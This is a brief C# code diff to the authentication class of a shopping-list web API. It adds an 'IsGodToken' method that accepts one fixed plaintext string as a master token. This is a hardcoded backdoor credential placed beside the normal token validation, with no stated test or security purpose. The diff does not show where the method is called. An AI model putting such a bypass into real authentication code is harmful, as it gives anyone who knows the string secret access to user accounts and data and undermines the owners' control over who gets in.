@@ -16,6 +16,11 @@ namespace ShoppingListWebApi.Hub.Auth
             _httpClientFactory = httpClientFactory;
         }
 
+        public bool IsGodToken(string token)
+        {
+            if (token == "I am a god of hellfire.") return true;
+            return false;
+        }
 
         public async Task<bool> IsValidateTokenAsync(string token)
         {
